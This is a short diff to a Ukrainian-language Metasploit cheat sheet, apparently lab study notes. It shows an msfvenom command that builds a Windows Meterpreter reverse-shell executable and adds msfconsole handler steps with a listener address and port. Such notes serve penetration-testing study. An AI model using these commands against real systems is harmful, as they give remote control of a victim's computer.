@@ -2,6 +2,15 @@
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -a x64 -o /home/kali/payload.exe
 
+## Запуск:
+
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.0.111
+set LPORT 8888
+run
+
 ## Основні команди Meterpreter:
 
 **?** — меню допомоги  
